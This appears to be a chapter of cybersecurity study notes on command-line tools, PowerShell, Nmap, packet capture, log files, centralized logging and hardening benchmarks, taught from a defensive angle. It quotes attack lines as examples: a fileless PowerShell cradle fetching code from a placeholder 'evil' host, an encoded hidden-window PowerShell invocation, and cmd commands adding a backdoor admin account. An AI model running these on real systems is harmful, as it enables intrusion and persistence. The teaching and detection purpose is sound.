# Chapter 5 — Tools of the Trade

The most practical chapter so far. Everything here is something you actually run, and the reason it matters for security is that **almost all attacker activity and almost all detection happens at the command line and in log files**, not in a GUI.

## 5.1 Touring the CLI

### Why the CLI at all

Fair question when every OS ships a graphical interface. The reasons hold up:

* **Automatable.** A GUI action can't be scripted, scheduled, version-controlled or repeated identically across 500 machines. A command can.
* **Remote and low-bandwidth.** SSH over a bad link works; remote desktop doesn't.
* **Precise and loggable.** A command is an exact, recordable statement of what was done. "I clicked around in the settings" is not.
* **It's what attackers use.** Post-exploitation happens on the command line, so reading command-line activity is how you detect it. A defender who can't read a shell command can't read the evidence.
* **Headless systems have nothing else.** Servers and containers usually have no GUI at all.

### Core Linux navigation and inspection

```bash
pwd                     # where am I
ls -la                  # list everything, including hidden, with permissions
cd /var/log             # move
find / -name "*.conf" 2>/dev/null       # search the filesystem
grep -r "password" /etc/                # search inside files
cat / less / head / tail                # read files
tail -f /var/log/auth.log               # follow a log live
```

### Security-relevant commands worth knowing cold

```bash
# who is on the system and what are they doing
whoami; id; w; last

# what's running
ps aux
top / htop

# what's listening on the network — the single most useful triage command
ss -tulpn               # modern
netstat -tulpn          # older systems

# permissions and ownership
chmod 600 file
chown user:group file

# what did this user do
history
```

`ss -tulpn` deserves its own note. It answers **"what on this machine is accepting connections, and which process owns it?"** — which is the first question for both hardening (attack surface reduction, chapter 6) and incident response (is there a listener that shouldn't be there?).

### Pipes and redirection

The thing that makes the CLI compose:

```bash
cat access.log | grep "404" | wc -l              # count 404s
ps aux | grep nginx                              # filter process list
command > file          # redirect stdout, overwrite
command >> file         # append
command 2>/dev/null     # discard errors
command 2>&1            # merge stderr into stdout
```

Chaining small tools is the entire Unix philosophy and it's why log analysis on the CLI is fast.

## 5.2 Shells

A **shell** is the program that interprets your commands. The terminal is just the window; the shell is what's reading.

### Linux shells

* **bash** - the default nearly everywhere. What scripts assume.
* **sh / dash** - minimal POSIX shell. Faster, fewer features, what `#!/bin/sh` gets you.
* **zsh** - bash-compatible with better completion and prompts. macOS default now.
* **fish** - friendly, and deliberately *not* POSIX-compatible, so scripts break.

`/etc/shells` lists valid login shells. Setting a user's shell to `/usr/sbin/nologin` or `/bin/false` prevents interactive login — which is what service accounts should have (chapter 4.9).

### Security relevance of shells

* **Reverse shells** - the standard post-exploitation payload. The victim machine connects *outbound* to the attacker, because outbound is usually permitted and inbound is usually firewalled. This is exactly why **egress filtering** matters and why most networks are far weaker on it than on ingress.
* **Shell history** - `~/.bash_history` is a genuine intelligence source in both directions. For defenders it shows what an attacker ran; for attackers it frequently contains passwords typed on the command line, hostnames, and internal paths. credhound treats history files as a lead for exactly this reason.
* **Restricted shells** (`rbash`) limit what a user can do, and are usually escapable — treat as a speed bump.

### Environment variables

```bash
echo $PATH
export API_KEY=xyz      # visible to child processes
env                     # list all
```

**Security note:** environment variables are readable via `/proc/<pid>/environ` by the process owner and by root. Passing secrets this way is common (containers do it constantly) and it means any local privilege escalation exposes every secret in every running process. That's a planned later slice of credhound for the same reason.

`PATH` order matters too — a writable directory early in `PATH` lets an attacker shadow a legitimate binary.

## 5.3 The Windows Command Line

`cmd.exe`. Older, more limited than PowerShell, and still worth knowing because it appears constantly in malware and in incident logs.

```cmd
dir                     :: list
cd                      :: change directory
type file.txt           :: read a file
copy / move / del       :: file operations

ipconfig /all           :: network configuration
ipconfig /flushdns      :: clear DNS cache
ping / tracert          :: connectivity
netstat -ano            :: connections with owning PID
nslookup                :: DNS queries

tasklist                :: running processes
taskkill /PID 1234 /F   :: kill a process

net user                :: local accounts
net user hacker P@ss /add          :: create an account
net localgroup administrators hacker /add   :: make it an admin
net share               :: shared folders
net use                 :: mapped drives

sc query                :: services
systeminfo              :: OS, patches, domain
whoami /all             :: user, groups and privileges
```

### Why these specific commands matter

That block from `net user` onward is close to a standard attacker enumeration sequence. `whoami /all`, `systeminfo`, `net user`, `net localgroup administrators`, `net share` — run within seconds of each other by the same process — is a recognisable pattern of someone orienting themselves on a freshly compromised host.

Which means **the detection isn't any single command, it's the sequence and the timing.** That's the TTP idea from chapter 1.3 becoming concrete: individually these are all legitimate administrative commands, and in that order, in that timeframe, from a user who never runs them, it's an intrusion.

`netstat -ano` gives connections with the owning PID, which you then map with `tasklist` — the Windows equivalent of `ss -tulpn`.

## 5.4 Microsoft PowerShell

A proper scripting language and object pipeline, not just a command runner. Vastly more capable than `cmd`, which cuts both ways.

### Basics

Commands are `Verb-Noun`, which makes them guessable:

```powershell
Get-Process
Get-Service
Get-ChildItem                    # ls / dir
Get-Content file.txt             # cat / type
Get-Help Get-Process -Examples
```

### The key difference from bash

**PowerShell pipes objects, not text.** In bash, `ps aux | grep nginx` passes a string that you then have to parse with `awk` or `cut`. In PowerShell you pass a real object with typed properties:

```powershell
Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending | Select-Object Name, CPU
```

No parsing, no fragile column-counting. This is genuinely nicer for structured data, and it's why PowerShell is so effective for both administration and attack tooling.

### Security-relevant cmdlets

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-NetTCPConnection                     # netstat equivalent
Get-WinEvent -LogName Security -MaxEvents 50
Get-FileHash file.exe -Algorithm SHA256
Get-ExecutionPolicy
```

### Why PowerShell dominates modern attacks

This is the part actually worth understanding:

* **It's pre-installed and signed** on every Windows machine, so it's a **living-off-the-land binary (LOLBin)** — the attacker brings no malware for a scanner to detect.
* **It runs in memory.** `IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')` fetches and executes a script that **never touches disk**. That's textbook **fileless malware** — nothing for signature-based AV to scan.
* **Deep system access** via .NET and WMI.
* **Easy obfuscation** — base64-encoded commands (`powershell -enc <blob>`), string concatenation, case randomisation.

`powershell.exe -nop -w hidden -enc <base64>` is close to a signature of malicious use by itself: no profile, hidden window, encoded command.

### Defences

* **Execution policy** - a guardrail against accidents, **not a security control.** It's bypassable with `-ExecutionPolicy Bypass` and half a dozen other ways. Don't count it.
* **Constrained Language Mode** - genuinely restricts what the language can do.
* **Script block logging and module logging** - records what actually executed, *including after de-obfuscation*, which is the single most valuable Windows logging setting for detection.
* **AMSI (Antimalware Scan Interface)** - lets AV inspect scripts at runtime, after decoding.
* **JEA (Just Enough Administration)** - constrained remote endpoints exposing only specific commands.

### The general lesson

PowerShell is the clearest example of **dual-use tooling**. The exact capability that makes it excellent for administration makes it excellent for attack. You cannot remove it without breaking Windows management, so the answer is **logging and constraining rather than blocking** — which is the same conclusion you reach for most legitimate admin tooling.

## 5.5 Linux Shells (scripting)

Same dual-use point, on the other OS.

```bash
#!/bin/bash
set -euo pipefail        # exit on error, undefined vars, and pipe failures

for user in $(cut -d: -f1 /etc/passwd); do
    echo "checking $user"
done

if [ -f /etc/shadow ]; then
    echo "shadow file present"
fi
```

`set -euo pipefail` at the top of every script is a habit worth forming — without it a failing command in the middle is silently ignored and the script continues in a broken state.

Attacker-relevant: cron jobs and systemd timers for persistence, `curl | bash` as the delivery pattern (and as a supply chain risk worth thinking about every time you run one), and `chmod +x` on a downloaded file.

## 5.6 Network Scanners

### What scanning is for

Discovering **what exists on a network and what it's running**. Both sides use it — defenders for asset inventory and attack surface management (you cannot protect what you don't know exists, chapter 1), attackers for reconnaissance.

### Types

* **Host discovery** - what IP addresses are alive.
* **Port scanning** - what TCP/UDP ports are open on each.
* **Service/version detection** - what software and version is behind each port.
* **OS fingerprinting** - what operating system, inferred from TCP/IP stack quirks.
* **Vulnerability scanning** - the layer above: matching discovered versions against known-CVE databases. This is Nessus/OpenVAS territory (chapter 12).

### Tools

* **Nmap** - the standard. Covered next.
* **Masscan** - asynchronous, absurdly fast, made for internet-scale sweeps. Less detail than Nmap.
* **Angry IP Scanner** - simple GUI host discovery.
* **Nessus / OpenVAS / Greenbone** - vulnerability scanners rather than pure port scanners.
* **Netcat (`nc`)** - the "swiss army knife". Manual connections, banner grabbing, file transfer, and building reverse shells.

```bash
nc -zv 192.168.1.10 20-25       # port check
nc 192.168.1.10 80              # connect and grab a banner manually
```

## 5.7 Network Scanning with Nmap

```bash
# host discovery only, no port scan
nmap -sn 192.168.1.0/24

# default scan — top 1000 TCP ports
nmap 192.168.1.10

# SYN / "stealth" scan (needs root)
sudo nmap -sS 192.168.1.10

# service version + OS detection + default scripts
nmap -sV -O -sC 192.168.1.10

# all 65535 TCP ports
nmap -p- 192.168.1.10

# UDP — slow, and worth it for DNS/SNMP/DHCP
sudo nmap -sU --top-ports 20 192.168.1.10

# timing: T0 paranoid ... T5 insane
nmap -T2 192.168.1.10

# NSE scripts
nmap --script vuln 192.168.1.10

# save output in all formats
nmap -oA scanresults 192.168.1.10
```

### Scan types and what they actually do

* **`-sT` TCP connect** - completes the full three-way handshake. No special privileges needed, and it **gets logged by the application** because a real connection was established.
* **`-sS` SYN scan** - sends SYN, gets SYN/ACK, then sends RST instead of completing. Historically called "stealth" because the connection never completed so many application logs missed it. **Any modern firewall or IDS sees it easily**, so "stealth" is now a historical name rather than a description.
* **`-sU` UDP scan** - slow and unreliable because UDP is connectionless: no response is ambiguous between "open" and "filtered". Still worth running, since DNS, SNMP and DHCP live there and get overlooked precisely because scanning them is annoying.
* **`-sn` ping sweep** - discovery only, no ports.

### Port states

* **open** - something is listening.
* **closed** - reachable, nothing listening (host responded with RST).
* **filtered** - no response; a firewall is dropping packets. The distinction between closed and filtered is informative in itself: `closed` means you reached the host, `filtered` means you didn't.

### The point I'd keep

**Scan aggressiveness is itself a detection risk.** A `-T5 -p-` scan across a subnet is loud and lights up every IDS. A `-T1` scan of a handful of ports may pass unnoticed. That trade — speed versus stealth — is a real operational decision on an authorised engagement, and from the defensive side it's why **detecting scanning behaviour** (many ports, one source, short window) is a standard IDS rule.

**And the legal line:** scanning systems you don't own or have written authorisation to test is illegal in most jurisdictions. Nmap against your own lab is fine. Nmap against someone else's infrastructure is not a grey area, and this is precisely what "rules of engagement" documents exist to establish (chapter 12).

## 5.8 Network Protocol Analyzers

A **protocol analyzer** (packet sniffer) captures raw frames off the wire and decodes them layer by layer.

### What it's used for

* Debugging — why isn't this connection working.
* Security analysis — what is this host actually talking to.
* Forensics — reconstructing an incident from a capture.
* Learning — genuinely the fastest way to make the OSI model (chapter 7) stop being abstract.

### Promiscuous vs monitor mode

* **Normal mode** - the NIC only passes frames addressed to it.
* **Promiscuous mode** - passes everything the NIC sees.
* **Monitor mode** - wireless-specific; captures raw 802.11 frames including management frames, without associating to a network.

### The switch problem

On a **hub**, all traffic goes everywhere, so sniffing sees everything. On a **switch**, traffic is forwarded only to the destination port — so you see your own traffic plus broadcast/multicast, and nothing else.

To capture other hosts' traffic on a switched network you need one of:
* **Port mirroring / SPAN** - configure the switch to copy traffic to your port. The legitimate method.
* **Network TAP** - a hardware device inline on the link.
* **ARP poisoning** - the attacker method (chapter 7), telling hosts you're the gateway.
* **MAC flooding** - overwhelm the switch's CAM table so it fails open and floods like a hub.

That's a useful thing to know from both sides: it's *why* an attacker needs ARP poisoning at all, and *why* a monitoring deployment needs SPAN ports designed in.

### The encryption reality

Most traffic today is TLS-encrypted, so a capture shows you **metadata, not content** — who talked to whom, when, how much, for how long, and the SNI/certificate details during handshake.

That metadata is still enormously useful. Beaconing at fixed intervals to an unknown host is visible without decrypting a single byte, which is exactly the C2 detection from chapter 1.3. It's also the reason **NetFlow** (metadata only, cheap) remains valuable alongside full packet capture.

## 5.9 Using Wireshark

The GUI analyzer. Deep decoding of thousands of protocols.

### Capture vs display filters

The distinction that trips everyone up:

* **Capture filters** (BPF syntax) decide **what gets recorded**. Applied before capture, can't be changed retroactively, and reduce file size.
  ```
  host 192.168.1.10
  port 80
  tcp and not port 22
  ```
* **Display filters** (Wireshark syntax) decide **what you see** from what's already captured. Changeable at any time.
  ```
  ip.addr == 192.168.1.10
  tcp.port == 443
  http.request.method == "POST"
  dns.qry.name contains "evil"
  tcp.flags.syn == 1 and tcp.flags.ack == 0     # SYN without ACK — scan detection
  ```

Note the syntax genuinely differs: `port 80` for capture, `tcp.port == 80` for display.

### Useful workflow

* **Follow TCP Stream** - reassembles a whole conversation into readable form. The fastest way to see what actually happened.
* **Statistics → Conversations** - who talked to whom and how much. Top talkers surface anomalies quickly.
* **Statistics → Protocol Hierarchy** - what protocols are present. Unexpected protocols are a lead.
* **Expert Information** - errors, retransmissions, malformed packets.

### Things you can see

* Cleartext credentials on FTP, Telnet, HTTP basic auth, unencrypted SMTP/POP3/IMAP. Doing this once in a lab is what makes the "insecure protocol → secure alternative" table in chapter 7 stop being memorisation.
* DNS queries — including tunnelling, which shows as abnormally long and frequent queries to one domain.
* The TLS handshake: SNI, certificate, cipher suites, and **the ClientHello**.

That last one connected directly to my Claude usage notifier project. Cloudflare was rejecting Python's `requests` despite correct headers and cookies, because it fingerprints the **shape of the TLS ClientHello** — cipher ordering and extension list — which doesn't match any real browser. That's **JA3 fingerprinting**, and being able to actually look at a ClientHello in Wireshark is what made it click rather than being a magic fix.

## 5.10 Using tcpdump

The CLI capture tool. Where you actually work on a server with no GUI.

```bash
# list interfaces
sudo tcpdump -D

# capture on an interface, don't resolve names (-n), verbose
sudo tcpdump -i eth0 -nn -v

# filter by host and port
sudo tcpdump -i eth0 host 192.168.1.10 and port 443

# write to a file for later analysis in Wireshark
sudo tcpdump -i eth0 -w capture.pcap

# read a file back
tcpdump -r capture.pcap

# show packet contents in ASCII / hex+ASCII
sudo tcpdump -i eth0 -A port 80
sudo tcpdump -i eth0 -X port 80

# ring buffer — 10 files of 100MB, don't fill the disk
sudo tcpdump -i eth0 -w cap.pcap -C 100 -W 10
```

**Always use `-nn`.** Without it, tcpdump does reverse DNS lookups on every address, which is slow and — more importantly — **generates network traffic from the machine you're investigating**, which is exactly what you don't want during an incident.

**The standard workflow** is capture headless with tcpdump, transfer the pcap, analyse in Wireshark. Both use the same BPF filter syntax for capture, so what you learn transfers.

**Watch the disk.** An unbounded capture on a busy interface fills a volume fast, which turns your investigation into an availability incident. Hence `-C`/`-W` ring buffers.

## 5.11 Log Files

### Linux

| Path | Contents |
|---|---|
| `/var/log/auth.log` (Debian/Ubuntu) | Authentication, sudo, SSH |
| `/var/log/secure` (RHEL/CentOS) | Same, different distro |
| `/var/log/syslog` / `/var/log/messages` | General system messages |
| `/var/log/kern.log` | Kernel |
| `/var/log/dmesg` | Boot messages |
| `/var/log/faillog`, `/var/log/btmp` | Failed logins |
| `/var/log/wtmp`, `/var/log/lastlog` | Login records |
| `/var/log/audit/audit.log` | auditd — detailed syscall auditing |

```bash
sudo tail -f /var/log/auth.log
sudo grep "Failed password" /var/log/auth.log | wc -l
sudo journalctl -u ssh --since "1 hour ago"
sudo journalctl -p err -b            # errors this boot
```

`systemd-journald` has largely replaced plain text logs on modern distros — binary format, queried with `journalctl`.

### Windows Event Log

Viewed in Event Viewer or with `Get-WinEvent`. Main channels: **Security**, **System**, **Application**, plus per-application channels including **PowerShell Operational**.

Event IDs worth recognising:

| ID | Meaning |
|---|---|
| 4624 | Successful logon |
| 4625 | **Failed logon** |
| 4634 / 4647 | Logoff |
| 4648 | Logon with explicit credentials (lateral movement indicator) |
| 4672 | **Special privileges assigned** — admin logon |
| 4720 | **User account created** |
| 4726 | User account deleted |
| 4732 | Member added to a security-enabled local group |
| 1102 | **Audit log cleared** — almost always worth investigating |
| 7045 | New service installed (common persistence) |
| 4104 | PowerShell script block logging |

**Logon types** on 4624 matter as much as the event itself: type 2 (interactive), 3 (network), 10 (RemoteInteractive/RDP). A type 10 from an unusual source is a very different story from a type 2 at a keyboard.

### Log levels

`DEBUG < INFO < NOTICE < WARNING < ERROR < CRITICAL < ALERT < EMERGENCY`. Syslog severity runs 0 (emergency) to 7 (debug).

### Rotation

`logrotate` on Linux — compresses and ages out old logs so they don't fill the disk. **Security tension:** rotating too aggressively destroys the evidence you need during an investigation. Retention has to be a deliberate decision (and it's a compliance requirement in regulated environments), not whatever the default config does.

### What to actually look for

* Repeated `Failed password` from one source → brute force.
* Failed logins spread across *many* accounts → password spraying (chapter 2.4).
* Successful login immediately after a run of failures → they got in.
* Logins at unusual hours or from unusual geography.
* `sudo` to root by an account that never does that.
* New accounts, new services, new scheduled tasks.
* **Gaps in the logs, or a cleared log (Event ID 1102).** Absence of data is data.

## 5.12 Centralized Logging

### Why it's non-negotiable

Four reasons, and the first is the one that matters most:

1. **An attacker with admin on a host can delete that host's logs.** If the only copy is local, your evidence is under the control of the person you're investigating. Shipping logs off-host in real time means they have to compromise the log server too, which is a second and much harder step.
2. **Correlation.** An attack spans a firewall, a VPN concentrator, a domain controller and a file server. No single log tells the story; only something looking across all of them does.
3. **Retention** beyond what a single host can hold.
4. **Availability** — if the host is wiped or dies, you still have its history.

### The stack

* **syslog / rsyslog / syslog-ng** - the classic protocol and daemons. UDP 514 traditionally (fire-and-forget, lossy), TCP 514 or **TLS 6514** for reliability and encryption.
* **SIEM** - Splunk, QRadar, Sentinel, Elastic, Wazuh, Graylog. Collect, normalise, correlate, alert.
* **Agents** - Filebeat, Fluentd, NXLog, Winlogbeat for Windows events.

### SIEM

**Security Information and Event Management.** The value is entirely in **correlation**. A failed VPN login, a firewall allow, and a large outbound transfer are individually unremarkable; in sequence from one identity within five minutes, that's exfiltration.

Two practical realities worth being honest about:

* **Pricing is usually by ingest volume**, so what you choose *not* to collect becomes a security decision made on cost grounds. That's an uncomfortable but real constraint.
* **Tuning is the job.** An untuned SIEM emits thousands of alerts daily, analysts stop reading them, and you've spent a fortune to be exactly as blind as before — but with an audit trail proving you were warned. **Alert fatigue is a security vulnerability**, not an annoyance.

### Related sources

* **SNMP** for device telemetry — **use v3**, since v1/v2c send community strings in cleartext.
* **NetFlow / sFlow / IPFIX** — flow metadata rather than payloads. Cheap, and it keeps working when everything is encrypted.
* **SOAR** — automation layer on top: enrich the alert, open the ticket, block the IP, isolate the host.

### Getting it right

* **NTP everywhere.** Correlation across systems is impossible if clocks disagree, and skewed timestamps undermine evidence.
* **Protect the log server** — separate credentials, restricted access, ideally append-only storage.
* **Monitor the pipeline itself.** A log source that silently stopped reporting three weeks ago is a blind spot you don't know you have.

## 5.13 Cybersecurity Benchmark Tools

Automated checking of a system against a secure configuration standard — the "are we actually configured the way we said we'd be" question from chapter 1.

* **CIS Benchmarks** - prescriptive hardening guides per OS/platform, with **Level 1** (safe baseline) and **Level 2** (stricter, may break functionality) profiles.
* **CIS-CAT** - the tool that scores a system against those benchmarks.
* **DISA STIGs** - the US DoD equivalent, generally stricter.
* **SCAP (Security Content Automation Protocol)** - the standard *format* for expressing all this so tools interoperate. Components include **CVE** (vulnerability IDs), **CCE** (configuration IDs), **CPE** (platform naming), **CVSS** (scoring), **OVAL** (assessment logic) and **XCCDF** (checklists).
* **OpenSCAP / `oscap`** - the open-source scanner that consumes SCAP content.
* **Lynis** - lightweight Linux audit script, good for a quick look.
* **Microsoft Security Compliance Toolkit** - Windows baselines as GPOs.

```bash
# list available profiles
oscap info /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml

# evaluate against a profile and produce a report
sudo oscap xccdf eval \
  --profile cis_level1_server \
  --results results.xml --report report.html \
  /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml
```

### The real point: configuration drift

Establishing a baseline is the easy part. **Systems don't stay configured** — emergency changes, software updates resetting settings, someone loosening a permission to make something work at 2am. Six months later nothing matches the baseline and nobody knows.

So benchmark tooling is only valuable if it runs **continuously**, not once at build time. That's the difference between "we hardened it" and "it is hardened", which is the maintain step of the three-step hardening lifecycle.

**And a caveat:** a benchmark score is not a security score. Passing CIS Level 1 with a vulnerable application on top of it means very little. Compliance and security overlap; they're not the same thing.

## 5.14 Lab — Configuring Linux Log Forwarding

Forwarding logs from a client to a central rsyslog server.

**On the server** (`/etc/rsyslog.conf`) — enable a listener:

```
# TCP is preferable to UDP: reliable delivery
module(load="imtcp")
input(type="imtcp" port="514")

# store received logs per sending host
$template RemoteLogs,"/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log"
*.* ?RemoteLogs
& stop
```

**On the client** (`/etc/rsyslog.d/60-forward.conf`):

```
# @  = UDP (lossy)
# @@ = TCP (reliable)
*.* @@192.168.1.50:514

# queue on disk if the server is unreachable, so logs aren't lost
$ActionQueueType LinkedList
$ActionQueueFileName fwdqueue
$ActionResumeRetryCount -1
$ActionQueueSaveOnShutdown on
```

```bash
sudo systemctl restart rsyslog
logger "test message from client"          # generate a test entry
sudo ss -tulpn | grep 514                  # confirm the server is listening
```

### Things worth noting

* **`@@` (TCP) over `@` (UDP).** UDP silently drops messages under load, which means the log that mattered is the one you lost.
* **The disk queue config is the important part.** Without it, logs generated while the server is unreachable are gone forever — and "the log server was briefly down" is a very convenient window for an attacker.
* **Encrypt it in production.** Plain 514 sends logs in cleartext across the network, and logs contain usernames, hostnames, paths and sometimes secrets. TLS on 6514 with certificates is the real-world configuration.
* **Firewall the log server** so only known senders can reach it — otherwise anyone can inject fabricated log entries, which poisons your evidence.

## 5.15 Lab — Linux Shell Script

A small triage script pulling together most of this chapter:

```bash
#!/bin/bash
# quick host triage — who's here, what's listening, what failed
set -euo pipefail

echo "=== host: $(hostname) at $(date -Is) ==="

echo -e "\n--- logged in now ---"
who

echo -e "\n--- listening sockets ---"
ss -tulpn 2>/dev/null | grep LISTEN

echo -e "\n--- UID 0 accounts (should only be root) ---"
awk -F: '$3 == 0 {print $1}' /etc/passwd

echo -e "\n--- last 10 failed SSH attempts ---"
grep "Failed password" /var/log/auth.log 2>/dev/null | tail -10 || echo "none found"

echo -e "\n--- top 5 source IPs by failed attempts ---"
grep "Failed password" /var/log/auth.log 2>/dev/null \
  | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' \
  | sort | uniq -c | sort -rn | head -5 || echo "none found"

echo -e "\n--- world-writable files in /etc ---"
find /etc -type f -perm -002 2>/dev/null || true
```

The last three blocks are the security-interesting ones. The **top-source-IP count** turns a wall of log lines into a ranked answer to "who is attacking me", which is the whole idea behind SIEM correlation done manually. The **UID 0 check** catches the backdoor account from chapter 4.9. And **world-writable files in `/etc`** is a privilege-escalation check — the same reasoning credhound applies, where the permission bits determine the severity.

## 5.16 Lab — Nmap

```bash
# 1. what's alive on my lab network
nmap -sn 192.168.56.0/24

# 2. what's open on the target
sudo nmap -sS -p- -T4 192.168.56.101 -oA fullports

# 3. what's actually running on those ports
sudo nmap -sV -sC -p 22,80,443,3306 192.168.56.101 -oA services

# 4. check for known issues
nmap --script vuln -p 80,443 192.168.56.101
```

Running this against my own machine was the useful part, because the honest result was **services listening that I had no idea were running**. That is precisely the asset management point from chapter 1 — you cannot protect, patch or monitor what you don't know exists — and it's a much more convincing lesson when it's your own box.

The follow-up is the hardening loop from chapter 6: for each open port, either justify it or turn it off. **A service that isn't running cannot be exploited by any vulnerability found in it in future**, which makes "disable what you don't use" the highest-leverage single action available.

---

## Chapter 5 — what I'd take away

* Attacker activity and detection both live at the command line and in logs. Not knowing the CLI means not being able to read the evidence.
* `ss -tulpn` and `netstat -ano` answer the most important triage question: what's listening, and who owns it.
* PowerShell is the model dual-use tool — you can't remove it, so you log and constrain it instead.
* Scan aggressiveness is itself a detection risk, and scanning without authorisation is illegal, not cheeky.
* Encryption means captures show metadata, not content — and metadata alone still exposes beaconing.
* Centralized logging exists mainly because an attacker with admin can delete local logs.
* Benchmarks only matter if they run continuously; systems drift.
